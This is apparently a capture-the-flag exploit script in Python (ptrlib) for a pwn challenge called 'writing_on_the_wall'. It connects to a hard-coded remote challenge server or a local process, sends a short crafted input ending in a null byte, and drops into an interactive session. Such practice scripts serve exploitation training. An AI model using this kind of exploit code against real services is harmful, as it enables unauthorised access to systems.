#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./writing_on_the_wall")
libc = ptr.ELF("./glibc/libc.so.6")
ld = ptr.ELF("./glibc/ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()
    input(">>")
    io.send("BCDEFG\x00")

    io.sh()


if __name__ == "__main__":
    main()
